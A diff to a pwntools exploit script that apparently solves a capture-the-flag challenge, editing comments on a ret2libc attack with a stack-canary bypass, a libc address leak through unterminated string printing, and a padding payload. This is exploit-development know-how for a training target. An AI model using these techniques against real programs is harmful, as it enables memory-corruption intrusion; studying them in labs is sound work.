@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 
-# NOTE: May not always work because the uint32_t value of the canary may be greater than that of the ROP gadgets
-# upon which the sorting done by the program will dislocate the stack canary causing the canary check to fail and
-# the program aborting. 
+# Challenge labels: ret2libc, scanf Behavior, Array OOB
+
+# NOTE: May not always work because the uint32_t value of the canary may be greater than that of the libc ROP 
+# gadgets (which are 0xf7XXXXXX and thus likely to be greater than the canary) upon which the sorting done by
+# the program will dislocate the stack canary causing the canary check to fail and the program aborting. 
 
 from pwn import *
 
@@ -30,8 +32,8 @@ def conn():
 def main():
     r = conn()
 
-    # Get leaks based on C string printing (exact offset can be found using gdb / brute-forcing remote and comparing to local)
-    # - For me, likely because the environments are different, the place on the stack where the libc addr leak occurs in local and remote differs
+    # Get leaks based on C string printing (exact offset can be found using gdb for local, or brute-forcing remote and comparing to local)
+    # For me, likely because the environments are different, the place on the stack where the libc addr leak occurs in local and remote differs
     if args.LOCAL: 
         r.sendafter(b'name :', b'A'*25)
     else: 
